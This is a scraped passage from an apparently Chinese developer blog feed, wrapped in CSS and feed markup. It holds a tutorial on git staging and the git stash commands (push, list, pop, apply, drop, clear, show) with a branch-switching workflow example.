1rgUl8JapBNYIowLoZtD9NWRTWKqqe36L48BSz8QPH9epqqIDehlh2UuqocEmrdV7AvhuRoM74m80yeDIEX3ppreNN235FxV58DNjhswn5K8zK21+5ctjut6NmUIoy9tVvitnHr2VDM3ahtW8KQ/Vbsp9GGiWHfk8skyTSFz9/HdxhHe4uR/RxX/mG1SGXwypcDJNmCMfucZ/C1CuCQUbiBUDYbe7tiRkZX8GIat50d+wqR1fdN7ygGzrHrcN4kGFHK02cil5M6INgQVsvnNz77T5PqUFYJJInYmIBplJfP5On4eiOwYfhuCD44oLyYVs43rI1rk3H7usttzq8Qo3j84vavN9mOkAeuq8dHEd9NtCVKX51Oen+MM6IEYvz5StOehKLpIjD+nKU5AQWJpLizdB+1sb5LQvFRxbSJVGHmSdK/0WWaPguEYmcSJ68aWkK6rAw6jwSSCmrTWVHT96R7HwHANEgqybVJL+E2vE2q7Uu91Gr73SbbNUvZDtiOlCeIv4r/AI+0XUwz1lvcAAAAAElFTkSuQmCC")}.markdown-body h2{position:relative;padding:0 0 0 20px;font-size:20px;font-weight:700;color:#614500}.markdown-body h2:before{content:"";position:absolute;top:3px;bottom:0;left:0;background-image:url("data:image/png;base64,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");background-size:100% 100%;background-repeat:no-repeat;width:15px;height:15px;margin:auto}.markdown-body h3{width:100%;text-align:left;margin:20px 10px 0 0;font-size:18px;font-weight:700;display:inline-block;padding-left:10px;padding-bottom:0;border-left:5px solid #8f6600;color:#614500}.markdown-body h4,.markdown-body h5,.markdown-body h6{font-weight:700;color:#a37400}.markdown-body h4{font-size:17px}.markdown-body h5,.markdown-body h6{display:flex;align-items:center}.markdown-body h5:after,.markdown-body h6:after{display:inline-block;border:2px solid #fff6e0;color:rgba(189,134,0,.5);border-radius:50%;text-align:center;margin-left:5px}.markdown-body h5{font-size:14px}.markdown-body h5:after{content:"5";width:15px;height:15px;line-height:15px;font-size:13px}.markdown-body h6{font-size:12px}.markdown-body h6:after{content:"6";width:13px;height:13px;line-height:13px;font-size:12px}.markdown-body p{color:#412c0c;letter-spacing:1px;font-weight:400;margin-bottom:16px}.markdown-body img{max-width:100%;display:block;margin:auto}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{color:#755300;font-weight:400;border-bottom:1px solid #755300;font-weight:bolder;text-decoration:none}.markdown-body table{width:100%!important;margin:0;font-size:12px;width:auto;max-width:100%;overflow:auto;border-collapse:collapse;border-spacing:0}.markdown-body table img{box-shadow:none}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body thead tr th{text-align:center}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px;box-sizing:border-box;border:1px solid rgba(72,42,10,.1)}.markdown-body blockquote{position:relative;text-size-adjust:100%;line-height:25px;font-weight:400;border-radius:10px;font-style:normal;text-align:left;box-sizing:inherit;border:1px solid #ffd87a;background-color:rgba(189,134,0,.5);margin:20px 0;padding:20px}.markdown-body blockquote p{color:#fff6e0;letter-spacing:2px;margin:0}.markdown-body blockquote:after,.markdown-body blockquote:before{position:absolute;color:#cc9100;font-size:34px;font-weight:700}.markdown-body blockquote:before{content:"❝";top:8px;left:5px}.markdown-body blockquote:after{content:"❞";right:5px;bottom:-5px}.markdown-body strong{color:#c28a00;font-weight:bolder}.markdown-body strong:before{content:"「"}.markdown-body strong:after{content:"」"}.markdown-body em{color:#c28a00}.markdown-body em strong{font-style:normal;color:#c28a00;background-color:#8a6200}.markdown-body s{color:#c28a00}.markdown-body hr{border-top:1px solid #805b00}.markdown-body code,.markdown-body li code,.markdown-body p code{color:#996d00;background-color:rgba(130,98,0,.3)}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit;color:#858585;font-family:bold;letter-spacing:1px}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body h1::selection,.markdown-body h2::selection,.markdown-body h3::selection,.markdown-body h4::selection,.markdown-body h5::selection,.markdown-body h6::selection,.markdown-body img::selection{color:rgba(189,134,0,.5);background-color:#fff}.markdown-body a::selection,.markdown-body b::selection,.markdown-body del::selection,.markdown-body em::selection,.markdown-body i::selection,.markdown-body strong::selection{background-color:transparent}.markdown-body pre&gt;code::selection{background-color:rgba(189,134,0,.5)}.markdown-body .math .math-inline::selection,.markdown-body blockquote::selection,.markdown-body ol::selection,.markdown-body p::selection,.markdown-body strong::selection,.markdown-body table::selection,.markdown-body ul::selection{background-color:rgba(189,134,0,.5)}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>在开发过程中，Git的暂存和Stash功能是管理代码变更的核心工具。本文将系统梳理<code>git add</code>、<code>git stash</code>及相关高级操作，帮助开发者高效处理工作区与暂存区的状态管理。</p>
</blockquote>
<h2 data-id="heading-0">✅ 基础暂存操作</h2>
<h4 data-id="heading-1">✅ 添加修改到暂存区</h4>
<p>通过<code>git add</code>命令将工作目录的修改标记为“准备提交”：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 添加单个文件</span>
git add file.txt

<span class="hljs-comment"># 添加所有修改的文件（不包括未跟踪的文件）</span>
git add .

<span class="hljs-comment"># 添加特定类型的文件（如所有.js文件）</span>
git add *.js
</code></pre>
<p><strong>功能</strong>：将修改存入暂存区，但不会立即创建提交记录。
<strong>注意</strong>：未跟踪的文件需先用<code>git add</code>添加才能暂存。</p>
<h4 data-id="heading-2">✅ 取消暂存</h4>
<p>误将文件添加到暂存区时，可通过以下命令撤销：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 取消单个文件的暂存</span>
git restore --staged file.txt

<span class="hljs-comment"># 取消所有文件的暂存</span>
git restore --staged .
</code></pre>
<p><strong>功能</strong>：将文件从暂存区移回工作目录，保留修改内容。</p>
<h2 data-id="heading-3">✅ 一、Git Stash 是什么？核心作用</h2>
<p><code>git stash</code> (中文常翻译为<strong>储藏 / 暂存 / 暂存搁置</strong>) 是 Git 中极其常用的命令，<strong>核心核心作用</strong>：</p>
<blockquote>
<p>临时「储藏 / 保存」<strong>工作区 + 暂存区</strong> 中所有<strong>未提交</strong>的修改内容，让你的工作区和暂存区<strong>立刻恢复到「干净状态」(和最近一次 commit 完全一致)</strong> ，且不会丢弃任何修改。</p>
</blockquote>
<h3 data-id="heading-4">✅ 什么时候必须用 Git Stash？（核心使用场景）</h3>
<p>这是使用 <code>git stash</code> 的<strong>黄金场景</strong>，遇到以下情况无脑用即可，也是工作中 99% 的使用场景：</p>
<ol>
<li><strong>正在当前分支开发新功能 / 改 Bug</strong>，突然需要切换到其他分支（比如 <code>test</code>/<code>release</code>）处理紧急问题；</li>
<li>当前分支的代码<strong>改了一半、还没写完、无法提交</strong>（提交不完整的代码会污染分支提交记录）；</li>
<li>切换分支前，Git 强制要求「工作区干净」，否则会提示冲突或无法切换。</li>
</ol>
<p>简单说：<strong>想切分支、代码没写完、不想提交</strong> → 用 <code>git stash</code> 就对了！</p>
<h2 data-id="heading-5">✅ 二、Git Stash 基础核心命令（必会，高频使用）</h2>
<p>所有命令按「使用频率从高到低」排序，优先掌握前 5 个即可满足 90% 的开发需求，<strong>推荐死记硬背 + 熟练使用</strong>。</p>
<p><strong>1. 核心存储：<code>git stash</code> / <code>git stash push</code></strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 方式1：最简写法（推荐，工作中99%用这个）</span>
git stash

<span class="hljs-comment"># 方式2：保存修改并添加描述信息</span>
git stash save <span class="hljs-string">"描述信息"</span>

<span class="hljs-comment"># 方式3：完整写法（和上面等价，push 可以省略） </span>
git stash push
</code></pre>
<p><strong>功能</strong>：把「工作区 + 暂存区」的所有未提交修改，<strong>临时保存到 Git 的「储藏栈」</strong>，工作区立刻变干净，所有修改被隐藏。</p>
<p><strong>2. 带备注存储：<code>git stash push -m "备注信息"</code> 【强烈推荐】</strong></p>
<pre><code class="hljs language-bash" lang="bash">git stash push -m <span class="hljs-string">"首页轮播图样式修改-未完成"</span> 

git stash push -m <span class="hljs-string">"订单模块bug修复-待测试"</span>
</code></pre>
<p><strong>功能</strong>：和 <code>git stash</code> 功能一致，唯一区别是<strong>给本次储藏添加「自定义备注」</strong>。</p>
<p>👉 为什么强烈推荐？当你多次 <code>git stash</code> 后，会有多个储藏记录，带备注能<strong>一眼区分每个储藏对应的修改内容</strong>，不会混淆，避免后续恢复错代码！</p>
<p><strong>3. 查看所有储藏记录：<code>git stash list</code></strong></p>
<pre><code class="hljs language-bash" lang="bash">git stash list
</code></pre>
<p><strong>功能</strong>：查看 Git 储藏栈中<strong>所有的临时存储记录</strong>，输出格式如下：</p>
<pre><code class="hljs language-plaintext" lang="plaintext">stash@{0}: On dev: 搜索框样式优化-未完成 
stash@{1}: On dev: 筛选条单选失效问题修复-待测试 
</code></pre>
<ul>
<li>储藏栈是「<strong>后进先出</strong>」的结构（栈结构）：最新的储藏记录排在最上面，编号 <code>stash@{0}</code>；</li>
<li>每个记录包含：编号、所属分支、自定义备注。</li>
</ul>
<p><strong>4. 恢复储藏的修改：<code>git stash pop</code> 【最常用恢复方式】</strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 恢复「最新的储藏记录」(stash@{0})，恢复后自动删除这条储藏记录 </span>
git stash pop 

<span class="hljs-comment"># 恢复「指定编号」的储藏记录，恢复后自动删除该记录 </span>
git stash pop stash@{1}
</code></pre>
<ul>
<li><strong>核心功能</strong>：<strong>将储藏的修改恢复到当前工作区</strong>，恢复后代码和你 stash 之前完全一致（工作区 + 暂存区的修改都回来）。</li>
<li><strong>关键特性</strong>：<code>pop</code> = 「恢复 + 删除」，恢复后这条储藏记录就从栈中消失了，<strong>适合确认只恢复一次的场景</strong>。
<strong>5. 恢复储藏的修改：<code>git stash apply</code> 【备选恢复方式】</strong></li>
</ul>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 恢复最新的储藏记录(stash@{0})，恢复后「不删除」这条储藏记录</span>
git stash apply

<span class="hljs-comment"># 恢复指定编号的储藏记录，恢复后「不删除」该记录</span>
git stash apply stash@{1}
</code></pre>
<ul>
<li><strong>核心功能</strong>：和 <code>git stash pop</code> 几乎一样，都是把储藏的修改恢复到工作区。</li>
<li><strong>关键区别</strong>：<code>apply</code> = 「只恢复，不删除」，恢复后这条储藏记录依然保存在栈中，<strong>适合需要多次恢复同一份修改的场景</strong>。</li>
</ul>
<p>✅ <strong>重点区分：<code>git stash pop</code> vs <code>git stash apply</code>（必考必用）</strong></p>
<p>这两个命令是最容易混淆的，记住<strong>核心差异只有一个</strong>：<strong>是否删除储藏记录</strong></p>
<p>✅ <code>git stash pop</code>：恢复 + 删除记录 → 「一次性恢复」，用完即删，推荐日常使用；</p>
<p>✅ <code>git stash apply</code>：只恢复，不删记录 → 「可重复恢复」，恢复后还能再次恢复这份修改，适合特殊场景。</p>
<h2 data-id="heading-6">✅ 三、Git Stash 进阶命令（必会，解决 80% 的问题）</h2>
<p><strong>1. 删除指定储藏记录：<code>git stash pop</code>储藏编号</strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 删除最新的储藏记录</span>
git stash drop stash@{0}

<span class="hljs-comment"># 删除指定编号的储藏记录</span>
git stash drop stash@{2}
</code></pre>
<p><strong>功能</strong>：<strong>只删除，不恢复</strong>。当你有一些无用的储藏记录，不想恢复只想清理时，用这个命令。</p>
<p><strong>2.  删除所有储藏记录：<code>git stash clear</code></strong></p>
<pre><code class="hljs language-bash" lang="bash">git stash clear
</code></pre>
<p><strong>功能</strong>：清空 Git 储藏栈中的<strong>所有</strong>储藏记录，<strong>慎用</strong>！执行后无法恢复被删除的记录，适合确认所有储藏都无用时的批量清理。</p>
<p><strong>3. 查看储藏的「具体修改内容」：<code>git stash show</code></strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 查看最新储藏的「文件变更列表」（只显示文件名+增删行数） </span>
git stash show

<span class="hljs-comment"># 查看最新储藏的「完整diff详情」（显示具体修改的代码行，推荐） </span>
git stash show -p

<span class="hljs-comment"># 查看指定编号储藏的完整diff详情</span>
git stash show -p stash@{1}
</code></pre>
<p><strong>功能</strong>：在恢复储藏前，想先看看这份储藏里具体改了哪些代码，避免恢复错内容时，用这个命令，<code>-p</code> 参数是核心（patch 补丁模式），能看到完整的代码修改。</p>
<p><strong>1. 储藏「未追踪的新文件」：<code>git stash -u</code> / <code>git stash --include-untracked</code></strong></p>
<pre><code class="hljs language-bash" lang="bash">git stash -u
<span class="hljs-comment"># 等价写法</span>
git stash --include-untracked
</code></pre>
<p><strong>重要特性补充</strong>：<strong>默认的 <code>git stash</code> 只会储藏「已追踪的文件」</strong>（已经被 Git 管理的文件，比如之前 commit 过的文件），对于工作区中<strong>新建的、从未被 git add 过的新文件（未追踪文件）</strong> ，默认不会被储藏。</p>
<p>加 <code>-u</code> 参数后：会把「已追踪文件的修改 + 未追踪的新文件」<strong>一起储藏</strong>，工作区彻底干净，连新文件都被隐藏了。
<strong>5. 储藏「忽略的文件」：<code>git stash -a</code> / <code>git stash --all</code></strong></p>
<pre><code class="hljs language-bash" lang="bash">git stash -a
<span class="hljs-comment"># 等价写法</span>
git stash --all
</code></pre>
<p><strong>功能</strong>：最强的储藏命令，会储藏「已追踪文件修改 + 未追踪新文件 + .gitignore 中忽略的文件」（比如 node_modules、dist 等），适合需要完全清空工作区的场景，日常开发很少用，特殊场景（比如切换分支前彻底清理）可用。</p>
<h2 data-id="heading-7">✅ 四、Git Stash 避坑指南 &amp; 核心注意事项（重中之重，必看！）</h2>
<p>这部分是最容易踩坑的地方，很多人用 stash 出问题，都是因为没注意这些规则，<strong>全部记住，能避开 99% 的坑！</strong></p>
<p><strong>✅ 注意 1：<code>git stash</code> 不会储藏的内容（默认行为）</strong></p>
<p>默认执行 <code>git stash</code> 时，以下内容<strong>绝对不会被储藏</strong>，会原封不动留在工作区：</p>
<ul>
<li>
<p><strong>从未被 Git 追踪过的文件</strong>（新建的、没执行过 <code>git add</code> 的文件）；</p>
</li>
<li>
<p><strong>被 <code>.gitignore</code> 忽略的文件</strong>（比如依赖包、打包产物、日志文件）；</p>
</li>
<li>
<p><strong>已经提交到版本库的文件</strong>（只会处理「未提交」的修改）。</p>
</li>
</ul>
<blockquote>
<p>✅ 解决办法：需要储藏未追踪文件用 <code>git stash -u</code>，需要储藏忽略文件用 <code>git stash -a</code>。</p>
</blockquote>
<p><strong>✅ 注意 2：stash 的恢复与「分支无关」，但有最佳实践</strong></p>
<p>很多人误以为「在哪个分支 stash，就只能在哪个分支恢复」，<strong>这个认知是错误的！</strong></p>
<p><strong>真相</strong>：Git 的 stash 是「全局的」，储藏的是「文件的修改内容」，不是和分支绑定的，你可以在 <code>dev</code> 分支 stash，然后切换到 <code>test</code> 分支恢复。</p>
<p>最佳实践：<strong>尽量在哪个分支储藏，就在哪个分支恢复</strong>！</p>
<blockquote>
<p>原因：不同分支的代码差异可能很大，跨分支恢复 stash 大概率会触发「代码冲突」，处理冲突会增加不必要的麻烦，除非你明确知道两份代码无冲突。</p>
</blockquote>
<p><strong>✅ 注意 3：储藏记录的「生命周期」</strong></p>
<p>储藏记录不是永久保存的，它是「临时缓存」，以下操作会删除储藏记录：</p>
<ul>
<li>执行 <code>git stash pop 编号</code>：恢复后自动删除该记录；</li>
<li>执行 <code>git stash drop 编号</code>：手动删除该记录；</li>
<li>执行 <code>git stash clear</code>：删除所有记录；</li>
<li>仓库被删除 / 迁移：储藏记录会跟着仓库消失（不会同步到远程仓库）。</li>
</ul>
<p><strong>✅ 注意 4：stash 无法储藏「空文件 / 空目录」</strong></p>
<p>如果你的修改只是新建了一个空文件 / 空目录，执行 <code>git stash</code> 不会生效，Git 会提示「No local changes to save」，这是 Git 的默认规则，无需处理。</p>
<p><strong>✅ 五、Git Stash 完整工作流程演示（工作中最常用，直接套用）</strong></p>
<p>给你一套完整的「标准流程」，遇到「代码没写完要切分支」的场景，直接按步骤执行即可，零错误、零踩坑，这是工作中最经典的用法：</p>
<h3 data-id="heading-8">场景：在 dev 分支开发新功能，写到一半，需要切换到 test 分支修紧急 Bug</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 步骤1：当前在 dev 分支，代码没写完，带备注储藏所有修改（推荐带-m）</span>
git stash push -m <span class="hljs-string">"dev-个人中心模块开发-未完成"</span>

<span class="hljs-comment"># 步骤2：查看储藏记录，确认储藏成功（可选，养成好习惯）</span>
git stash list

<span class="hljs-comment"># 步骤3：切换到目标分支（此时工作区干净，切换无任何问题）</span>
git checkout <span class="hljs-built_in">test</span>

<span class="hljs-comment"># 步骤4：在 test 分支修复 Bug，完成后正常提交</span>
git add . git commit -m <span class="hljs-string">"test-修复订单支付失败bug"</span>

<span class="hljs-comment"># 步骤5：切回原分支</span>
dev git checkout dev

<span class="hljs-comment"># 步骤6：恢复之前储藏的未完成代码（推荐用pop，恢复后删除记录）</span>
git stash pop

<span class="hljs-comment"># 步骤7：继续开发未完成的功能即可，代码和之前完全一致 ✔️</span>
</code></pre>
<h2 data-id="heading-9"><strong>✅ 核心知识点速记</strong></h2>
<h3 data-id="heading-10">✅ 核心概念</h3>
<ol>
<li>git stash：临时保存未提交修改，让工作区变干净，核心场景「代码没写完要切分支」；</li>
<li>stash 是「栈结构」，后进先出，最新的记录是 stash@{0}。</li>
</ol>
<h3 data-id="heading-11">✅ 必会核心命令（按优先级排序）</h3>
<ol>
<li>储藏：<code>git stash push -m "备注"</code> （带备注，推荐首选）</li>
<li>查看：<code>git stash list</code></li>
<li>恢复：<code>git stash pop</code> （恢复 + 删除，日常首选） / <code>git stash apply</code>（恢复不删除，备选）</li>
<li>删除：<code>git stash drop 编号</code>（删指定） / <code>git stash clear</code>（删全部）</li>
<li>查看修改：<code>git stash show -p</code></li>
</ol>
<h3 data-id="heading-12">✅ 两大避坑重点</h3>
<ol>
<li>默认不储藏「未追踪文件」和「忽略文件」，需要则加 <code>-u</code> / <code>-a</code>；</li>
<li>尽量「同分支储藏、同分支恢复」，避免跨分支冲突。</li>
</ol>
<h3 data-id="heading-13">✅ 核心区别速记</h3>
<p><code>git stash pop</code> → 恢复 + 删记录；<code>git stash apply</code> → 恢复不删记录。</p>
<h5 data-id="heading-14"><strong>小剧场</strong>分享几个好看的MD主题</h5>
<ul>
<li><strong>qklhk-chocolate</strong></li>
<li>scrolls-light</li>
<li>Chinese-red</li>
<li>nico</li>
<li>devui-blue</li>
<li>z-blue</li>
<li>yu</li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[栈与队列：力扣“双胞胎”的相爱相杀，从括号配对到滑窗最大值！]]></title>    <link>https://juejin.cn/post/7602503154505302057</link>    <guid>https://juejin.cn/post/7602503154505302057</guid>    <pubDate>2026-02-03T13:46:56.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602503154505302057" data-draft-id="7602497125267701766" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="栈与队列：力扣“双胞胎”的相爱相杀，从括号配对到滑窗最大值！"/> <meta itemprop="keywords" content="JavaScript,算法,LeetCode"/> <meta itemprop="datePublished" content="2026-02-03T13:46:56.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="生椰丝绒拿铁"/> <meta itemprop="url" content="https://juejin.cn/user/4185180725584116"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            栈与队列：力扣“双胞胎”的相爱相杀，从括号配对到滑窗最大值！
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4185180725584116/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    生椰丝绒拿铁
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-03T13:46:56.000Z" title="Tue Feb 03 2026 13:46:56 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-03
